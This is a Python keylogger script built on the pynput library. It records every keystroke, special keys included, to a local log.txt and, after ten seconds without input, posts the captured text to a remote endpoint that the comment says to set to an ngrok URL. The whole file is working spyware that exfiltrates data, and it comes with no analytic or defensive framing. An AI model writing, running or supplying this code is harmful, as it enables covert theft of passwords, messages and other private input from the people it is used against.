# You can run this one to test it
from pynput.keyboard import Listener, Key
import requests
import threading
import json

ngrok_url = "http://127.0.0.1:8000"  # Replace with your ngrok URL
captured_words = ""
timer = None

def send_post_req():
    global captured_words
    try:
        payload = json.dumps({"keyboardData": captured_words})
        r = requests.post(ngrok_url, data=payload, headers={"Content-Type": "application/json"})
    except:
        print("Couldn't complete request!")
    finally:
        captured_words = ""  # Clear the captured words

def schedule_request():
    global timer
    timer = threading.Timer(10, send_post_req)
    timer.start()

def cancel_request():
    global timer
    if timer:
        timer.cancel()

def write_to_file(key):
    global captured_words
    special_keys = {
        Key.space: ' ',
        Key.enter: '<enter>',
        Key.tab: '\t',
        Key.backspace: '<backspace>',
        Key.shift: '<shift>',
        Key.shift_r: '<shift_r>',
        Key.ctrl: '<ctrl>',
        Key.ctrl_r: '<ctrl_r>',
        Key.alt: '<alt>',
        Key.alt_r: '<alt_r>',
        Key.cmd: '<cmd>',
        Key.cmd_r: '<cmd_r>',
        Key.delete: '<delete>',
        Key.home: '<home>',
        Key.end: '<end>',
        Key.page_up: '<page_up>',
        Key.page_down: '<page_down>',
        Key.up: '<up>',
        Key.down: '<down>',
        Key.left: '<left>',
        Key.right: '<right>',
        Key.caps_lock: '<caps_lock>',
        Key.num_lock: '<num_lock>',
        Key.scroll_lock: '<scroll_lock>',
        Key.f1: '<f1>',
        Key.f2: '<f2>',
        Key.f3: '<f3>',
        Key.f4: '<f4>',
        Key.f5: '<f5>',
        Key.f6: '<f6>',
        Key.f7: '<f7>',
        Key.f8: '<f8>',
        Key.f9: '<f9>',
        Key.f10: '<f10>',
        Key.f11: '<f11>',
        Key.f12: '<f12>'
    }

    if key in special_keys:
        captured_words += special_keys[key]
        with open('log.txt', 'a') as f:
            f.write(special_keys[key])
    else:
        letter = str(key).replace("'", "")
        captured_words += letter
        with open('log.txt', 'a') as f:
            f.write(letter)

    cancel_request()  # Cancel the previous timer
    schedule_request()  # Schedule a new timer


with Listener(on_press=write_to_file) as l:
    schedule_request()
    l.join()